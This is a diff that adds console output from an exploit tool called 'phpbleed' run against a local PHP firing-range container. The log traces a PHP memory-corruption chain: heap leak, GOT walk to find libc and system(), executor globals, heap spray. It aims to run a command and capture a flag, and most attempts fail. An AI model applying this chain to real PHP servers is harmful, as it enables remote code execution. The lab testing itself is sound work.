@@ -54,3 +54,241 @@
     GOT read: len=64200, got 64200 bytes
     External pointer groups: 51 total, 17 nearby
     Trying nearby[0] = 0xed3f887fc2e0
+      ELF @ 0xed3f887b0000 (phnum=7, est_off=0x4c000)
+      DSO @ 0xed3f887f0000 (phnum=7)
+    Trying nearby[1] = 0xed3f88a59000
+    Trying nearby[2] = 0xed3f89b82fc8
+      ELF @ 0xed3f89b20000 (phnum=9, est_off=0x62000)
+      DSO @ 0xed3f89b70000 (phnum=9)
+    Trying nearby[3] = 0xed3f89c10010
+    Trying nearby[4] = 0xed3f89c9cdc0
+      ELF @ 0xed3f89c20000 (phnum=9, est_off=0x7c000)
+    Trying nearby[5] = 0xed3f89ec126c
+    Trying nearby[6] = 0xed3f8a01b168
+      ELF @ 0xed3f89fb0000 (phnum=9, est_off=0x6b000)
+    Trying nearby[7] = 0xed3f8a0efb84
+    Trying nearby[8] = 0xed3f8a170348
+    Trying nearby[9] = 0xed3f8a349864
+    Trying nearby[10] = 0xed3f8a460ea0
+    Trying nearby[11] = 0xed3f8a4e5244
+    Trying nearby[12] = 0xed3f8a56e4c4
+    Trying nearby[13] = 0xed3f8a89fcc0
+      ELF @ 0xed3f8a850000 (phnum=9, est_off=0x4f000)
+    Trying nearby[14] = 0xed3f8a9f170c
+      ELF @ 0xed3f8a9a0000 (phnum=9, est_off=0x51000)
+      DSO @ 0xed3f8a9f0000 (phnum=9)
+    Trying nearby[15] = 0xed3f8aa963f4
+      ELF @ 0xed3f8aa20000 (phnum=9, est_off=0x76000)
+    Trying nearby[16] = 0xed3f8c324b60
+      ELF @ 0xed3f8c2e5000 (phnum=9, est_off=0x3f000)
+      DSO @ 0xed3f8c322000 (phnum=3)
+18:23:04Z [R-4] FAILED (libc not located)
+  libc not located
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+18:25:06Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+  heap_ref = 0xed3f88a581a0
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+
+[Phase R-4] Libc discovery via GOT dump
+    PT_DYNAMIC @ 0xed3f8b99e590
+    .dynamic via anchor -0x8 (len=75099, got=1024b)
+    Reading GOT via DT_PLTRELSZ len=64200 (0xfac8)
+    GOT read: len=64200, got 64200 bytes
+    External pointer groups: 51 total, 17 nearby
+    Trying nearby[0] = 0xed3f887fc2e0
+      DSO @ 0xed3f887f0000 (phnum=7)
+    Trying nearby[1] = 0xed3f88a59000
+    Trying nearby[2] = 0xed3f89b82fc8
+      DSO @ 0xed3f89b70000 (phnum=9)
+    Trying nearby[3] = 0xed3f89c10010
+      ELF @ 0xed3f89b70000 (phnum=9, -0xa0000)
+      ELF @ 0xed3f89b20000 (phnum=9, -0xf0000)
+      ELF @ 0xed3f89ad0000 (phnum=9, -0x140000)
+      ELF @ 0xed3f89a80000 (phnum=9, -0x190000)
+      ELF @ 0xed3f89a30000 (phnum=9, -0x1e0000)
+      ELF @ 0xed3f899f0000 (phnum=9, -0x220000)
+      ELF @ 0xed3f89980000 (phnum=9, -0x290000)
+      ELF @ 0xed3f89940000 (phnum=9, -0x2d0000)
+      ELF @ 0xed3f898d0000 (phnum=9, -0x340000)
+      ELF @ 0xed3f89850000 (phnum=9, -0x3c0000)
+      ELF @ 0xed3f89820000 (phnum=9, -0x3f0000)
+    Trying nearby[4] = 0xed3f89c9cdc0
+    Trying nearby[5] = 0xed3f89ec126c
+    Trying nearby[6] = 0xed3f8a01b168
+    Trying nearby[7] = 0xed3f8a0efb84
+    Trying nearby[8] = 0xed3f8a170348
+      ELF @ 0xed3f89fb0000 (phnum=9, -0x1c0000)
+      ELF @ 0xed3f89e10000 (phnum=9, -0x360000)
+    Trying nearby[9] = 0xed3f8a349864
+    Trying nearby[10] = 0xed3f8a460ea0
+      ELF @ 0xed3f8a230000 (phnum=9, -0x230000)
+      ELF @ 0xed3f8a180000 (phnum=10, -0x2e0000)
+    Trying nearby[11] = 0xed3f8a4e5244
+    Trying nearby[12] = 0xed3f8a56e4c4
+    Trying nearby[13] = 0xed3f8a89fcc0
+    Trying nearby[14] = 0xed3f8a9f170c
+      DSO @ 0xed3f8a9f0000 (phnum=9)
+    Trying nearby[15] = 0xed3f8aa963f4
+    Trying nearby[16] = 0xed3f8c324b60
+      DSO @ 0xed3f8c322000 (phnum=3)
+18:27:08Z [R-4] FAILED (libc not located)
+  libc not located
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+18:29:26Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+  heap_ref = 0xed3f88a581a0
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+18:29:27Z [R-4] fast path: system @ 0xed3f8c0092c0 in R-2 candidate 0xed3f8bfc0000 (reqs=19)
+  system() = 0xed3f8c0092c0
+
+[Phase R-5] EG and stdClass class entry
+  EG @ 0xed3f8b9c2e40 (class_table slot +0x1b8)
+  anchor at EG-0x7f0: len=8192
+    class_table = 0xb8050702eb10
+  class_table HT: nTableMask=-512 arData=0xb805071c1e50 nUsed=194
+  stdclass ce = 0xb8050706e570
+18:29:27Z [R-5] stdClass ce = 0xb8050706e570 (reqs=25)
+
+[Phase R-5b] handlers-table offset derivation (8.2 retune)
+  std_object_handlers         @ 0xed3f8b99e2d0
+  zend_std_get_properties_for @ 0xed3f8afa8a88
+  live table read inconclusive; will use header-derived offset
+18:29:27Z [R-5b] gpfoff = 0xc0 (header-derived)
+  get_properties_for = handlers+0xc0
+18:29:27Z [R-6/R-7 round 1] opening fresh worker pin
+
+[Phase R-6] round 1: pinning one worker (keep-alive)
+18:29:27Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:27Z [R-6 round 1] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:29:27Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:28Z [R-6] FAILED round 1 (spray slot not found)
+18:29:28Z [R-6/R-7 round 2] opening fresh worker pin
+
+[Phase R-6] round 2: pinning one worker (keep-alive)
+18:29:28Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:28Z [R-6 round 2] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:29:28Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:28Z [R-6] FAILED round 2 (spray slot not found)
+18:29:28Z [R-6/R-7 round 3] opening fresh worker pin
+
+[Phase R-6] round 3: pinning one worker (keep-alive)
+18:29:28Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:28Z [R-6 round 3] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:29:28Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:28Z [R-6] FAILED round 3 (spray slot not found)
+18:29:28Z [R-6/R-7 round 4] opening fresh worker pin
+
+[Phase R-6] round 4: pinning one worker (keep-alive)
+18:29:28Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6 round 4] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:29:29Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6] FAILED round 4 (spray slot not found)
+18:29:29Z [R-6/R-7 round 5] opening fresh worker pin
+
+[Phase R-6] round 5: pinning one worker (keep-alive)
+18:29:29Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6 round 5] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:29:29Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6] FAILED round 5 (spray slot not found)
+18:29:29Z [R-6/R-7 round 6] opening fresh worker pin
+
+[Phase R-6] round 6: pinning one worker (keep-alive)
+18:29:29Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6 round 6] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:29:29Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6] FAILED round 6 (spray slot not found)
+18:29:29Z [R-6/R-7 round 7] opening fresh worker pin
+
+[Phase R-6] round 7: pinning one worker (keep-alive)
+18:29:29Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6 round 7] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:29:29Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6] FAILED round 7 (spray slot not found)
+18:29:29Z [R-6/R-7 round 8] opening fresh worker pin
+
+[Phase R-6] round 8: pinning one worker (keep-alive)
+18:29:29Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6 round 8] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:29:29Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xed3f88a00000
+18:29:29Z [R-6] FAILED round 8 (spray slot not found)
+18:29:29Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+
+  No flag in HTTP stream yet; check 'their channel':
+  docker logs --tail 50 php-firing-range-bleed82-1
+
+[*] Total requests: 70 (crashes: 38)
